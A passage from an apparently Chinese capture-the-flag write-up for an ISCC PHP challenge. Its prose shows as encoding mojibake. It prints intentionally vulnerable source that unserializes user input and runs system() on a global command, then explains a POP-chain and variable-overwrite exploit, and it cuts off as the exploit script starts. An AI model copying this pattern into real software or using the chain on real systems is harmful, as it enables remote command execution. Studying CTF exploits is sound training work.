class="hljs-keyword">if</span> (<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">500000</span>) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;</span>;<br>                        <span class="hljs-variable">$iscc_file</span> = <span class="hljs-variable">$target_file</span>;<br>                        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_ok&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    finalize();<br>                    <span class="hljs-keyword">exit</span>;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;</span>;<br>                finalize();<br>                <span class="hljs-keyword">exit</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!is_string(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Login</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;login();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;logout();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        <span class="hljs-variable">$pAssM0rd</span> = hash(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-variable">$flag</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pAssM0rd&#x27;</span>] === <span class="hljs-variable">$pAssM0rd</span>)<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_TellMeTruth</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¼¼ä¹è¿™ä¸ª &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: <span class="hljs-subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randstr</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;<br>    <span class="hljs-variable">$randstring</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randstring</span> .= <span class="hljs-variable">$characters</span>[rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$characters</span>))];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randstring</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finalize</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>    @unlink(<span class="hljs-variable">$iscc_file</span>);<br>    <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$whatareyounongshane</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>];<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$whatareyounongshane</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;src&quot;</span>:<br>            highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;cmd&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;reset&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;upload&quot;</span>:<br>            <span class="hljs-variable">$resp</span> = &lt;&lt;&lt;EOF<br>&lt;form action=<span class="hljs-string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;iscc_file&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload Image&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>EOF;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$resp</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;tellmetruth&quot;</span>:<br>            <span class="hljs-keyword">echo</span> base64_decode(<span class="hljs-string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;</span>;<br>    &#125;<br>    finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>])) &#123;<br><br>    <span class="hljs-variable">$wtf</span> = waf(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;?&#x27;</span>&#125;) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$goodshit</span> = @unserialize(<span class="hljs-variable">$wtf</span>)) &#123;<br>        <span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$status</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;upload_ok&#x27;</span>, <span class="hljs-string">&#x27;upload_fail&#x27;</span>, <span class="hljs-string">&#x27;reset&#x27;</span>), <span class="hljs-literal">true</span>))<br>        finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ISCC_Commandç±»é‡Œé¢çš„__destructæ–¹æ³•å¯ä»¥æ‰§è¡Œcmdå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨ISCC_ResetCMDç±»é‡Œé¢å¯¹cmdè¿›è¡Œé‡æ–°èµ‹å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„__destructæ–¹æ³•å¿…é¡»å¾—æ»¡è¶³è¿™ä¸ªæ‰èƒ½é‡ç½®å‘½ä»¤,å³éœ€è¦åä¸ºisccIsCciScc1sccçš„SESSION</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡å˜é‡è¦†ç›–æ¥æ§åˆ¶$_SESSIONçš„å€¼</p><p>ISCC__Uploadç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>$GLOBALS[&#39;key&#39;] = value;</code>ä¸ºå…¨å±€å˜é‡çš„è¦†ç›–ï¼Œå½“<code>$is_uploadä¸ºtrue</code>çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªå¾ªç¯ï¼Œå¯ä»¥å®ç°<code>$_SESSION</code>çš„å˜é‡è¦†ç›–ã€‚</p><p>è€Œåœ¨uploadç±»é‡Œé¢çš„__wakeupæ–¹æ³•é‡Œé¢<code>$is_upload = (count($_FILES) &gt; 0);</code>ä¼šæŠŠä»–è®¾ç½®æˆtrueï¼Œå…¶ä»–çš„ç±»éƒ½è®¾ç½®æˆäº†falseã€‚</p><p>è¿™é‡Œäº†è§£ä¸€ä¸‹<code>$_FILES</code>ï¼Œ<code>$_FILES</code>é€šè¿‡ HTTP POST æ–¹å¼ä¸Šä¼ åˆ°å½“å‰è„šæœ¬çš„é¡¹ç›®çš„æ•°ç»„ã€‚<br>æ•°ç»„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]  ã€€ã€€ã€€  <span class="hljs-comment">#å®¢æˆ·ç«¯æœºå™¨æ–‡ä»¶çš„åŸåç§°ã€‚</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]ã€€ã€€ã€€ã€€  <span class="hljs-comment">#æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œå¦‚æœæµè§ˆå™¨æä¾›æ­¤ä¿¡æ¯çš„è¯ã€‚ä¸€ä¸ªä¾‹å­æ˜¯â€œimage/gifâ€ã€‚ä¸è¿‡æ­¤ MIME ç±»å‹åœ¨ PHP ç«¯å¹¶ä¸æ£€æŸ¥ï¼Œå› æ­¤ä¸è¦æƒ³å½“ç„¶è®¤ä¸ºæœ‰è¿™ä¸ªå€¼ã€‚</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]ã€€ã€€ã€€ã€€  <span class="hljs-comment">#å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]    <span class="hljs-comment">#æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åã€‚</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]       <span class="hljs-comment">#å’Œè¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚æ­¤é¡¹ç›®æ˜¯åœ¨ PHP 4.2.0 ç‰ˆæœ¬ä¸­å¢åŠ çš„ã€‚</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å°±è¦è®©uploadæ‰§è¡Œ__destructçš„æ—¶å€™ï¼Œis_uploadæ˜¯true<br>è¿™å°±è¦æ±‚ï¼Œæœ€æ—©æ‰§è¡Œ__destructï¼Œæœ€æ™šæ‰§è¡Œ__wakeupï¼Œæ‰€ä»¥å°±å¯ä»¥æŒ‰ä¸€å®šé¡ºåºæ¥æ„é€ POPé“¾</p><p>ç”±äºæœ‰ä¸€ä¸ªwafå‡½æ•°ï¼Œä¸èƒ½å‡ºç°<code>*</code>å·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ISCC_ResetCMDç±»çš„<code>$new_cmd</code>çš„å±æ€§æ˜¯protectedçš„ï¼Œåºåˆ—åŒ–åä¼šå¸¦æœ‰<code>*</code>ï¼Œè¿™å°±éœ€è¦ISCC_Uploadç±»çš„__wakeupåœ¨è¿™äº›ç±»çš„æœ€åè¿›è¡Œï¼Œä½†æ˜¯__destructè¦åœ¨ç¬¬ä¸€ä¸ªå¼€å§‹ã€‚éœ€è¦æŒ‰ä¸€å®šé¡ºåºæ¥æ„é€ POPé“¾::</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;cat 